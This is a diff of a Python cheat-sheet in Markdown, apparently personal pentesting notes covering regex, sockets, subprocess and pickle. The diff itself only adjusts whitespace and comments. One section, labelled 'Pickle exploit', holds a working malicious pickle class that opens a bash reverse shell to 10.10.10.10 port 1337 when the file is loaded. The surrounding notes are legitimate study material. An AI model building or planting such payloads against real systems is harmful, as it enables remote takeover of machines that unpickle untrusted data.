@@ -205,8 +205,6 @@ pattern = '[0-9]'
 res = sum(1 for _ in re.finditer("", r.text)) #, re.IGNORECASE))
 res = len(re.findall('', string))#, re.IGNORECASE))
 res = [re.sub(pattern, '', i) for i in list] 
-
-
 ```
 
 ### Boolean
@@ -234,7 +232,6 @@ r.json
 ```
 ### socket
 ```python
-
 import socket
 
 ip_address = "127.0.0.1"
@@ -255,6 +252,7 @@ import pwntools
 # Advanced
 
 ### Subproceses
+
 [Reference](https://www.digitalocean.com/community/tutorials/how-to-use-subprocess-to-run-external-programs-in-python-3)
 
 ```python
@@ -291,8 +289,8 @@ exit_code = subprocess.call
 ```python
 async def put_proc_queue():
 #tools_dictionary key and the value become
-    = mp.Process(target=
-    .start()
+#    = mp.Process(target=
+#   .start()
 
 async def pop_entire_proc_queue():
     for proc in proc_queue:
@@ -408,7 +406,6 @@ To un-pickle the data you can: [Ref](https://stackoverflow.com/questions/2490612
 ```python
 import pickle
 
-
 with open('serialized.pkl', 'rb') as f:
     data = pickle.load(f)
 ```
@@ -417,12 +414,10 @@ Pickle exploit
 ```python
 import pickle, base64, os
 
-
 class RCE:
     def __reduce__(self):
         cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/10.10.10.10/1337 <&1'")
         return os.system, (cmd,)
-
 
 if __name__ == "__main__":
     with open('badpickle.pkl', 'wb') as f:
@@ -431,6 +426,7 @@ if __name__ == "__main__":
     #with open('badpickle.pkl', 'rb') as f:
     #    data = pickle.load(f)
 ```
+
 
 # Appendix
 
